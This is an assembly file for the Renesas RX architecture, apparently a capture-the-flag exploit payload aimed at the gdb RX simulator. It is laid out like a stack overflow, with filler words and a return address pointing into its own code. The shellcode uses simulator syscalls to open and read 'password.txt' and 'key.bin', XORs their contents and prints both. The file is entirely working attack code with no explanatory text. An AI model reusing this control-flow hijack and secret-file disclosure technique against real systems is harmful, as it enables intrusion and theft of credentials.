/*
 * Use syscall.
 * See gdb/sim/rx/rx.c:decode_opcode() (case RXO_int:)
 * See gdb/sim/rx/syscalls.c:rx_syscall()
 */

/* See gdb/sim/rx/syscall.h */
#define SYS_exit  1
#define SYS_open  2
#define SYS_close 3
#define SYS_read  4
#define SYS_write 5

	.org	0x1c10 - 4 - 256 - 4 - 4 - 16

	.section .text

	.globl	_start
	.type	_start, @function
_start:
	.long	0x61626364
	.long	0
	.long	0
	.long	0

	.long	0 /* R7 */
	.long	_code

_code:
	mov.l	#_start, r0

	/*
	 * SYSCALL NO: R5
	 * ARG1-3: R1-R3 (open: R1,*(SP+4),*(SP+8))
	 * RETVAL: R1
	 * ERRCODE: -
	 */

___open:
	mov.l	#_fname, r1
	mov.l	#0, 4[r0]
	mov.l	#0, 8[r0]
	mov	#SYS_open, r5
	int	#255

___read:
	mov.l	#_buffer, r2
	mov	#16, r3
	mov	#SYS_read, r5
	int	#255

_save_size:
	mov.l	r1, r4

___kopen:
	mov.l	#_kname, r1
	mov.l	#0, 4[r0]
	mov.l	#0, 8[r0]
	mov	#SYS_open, r5
	int	#255

___kread:
	mov.l	#_kbuffer, r2
	mov.l	r4, r3
	mov	#SYS_read, r5
	int	#255

_exchange:
	mov.l	#_buffer, r1
	mov.l	#_kbuffer, r2
	mov.l	r1, r3
	add	r4, r3
1:	mov.b	[r1], r5
	mov.b	[r2+], r6
	xor	r6, r5
	mov.b	r5, [r1+]
	cmp	r1, r3
	bne.b	1b

___write:
	mov	#1, r1
	mov.l	#_buffer, r2
	mov.l	r4, r3
	mov	#SYS_write, r5
	int	#255

___kwrite:
	mov	#1, r1
	mov.l	#_kbuffer, r2
	mov.l	r4, r3
	mov	#SYS_write, r5
	int	#255

___exit:
	mov	#0, r1
	mov	#SYS_exit, r5
	int	#255

_fname:	.string	"password.txt"
_kname:	.string	"key.bin"

	.align 2
_code_end:

_buffer:
	.space	16
_kbuffer:
	.space	16
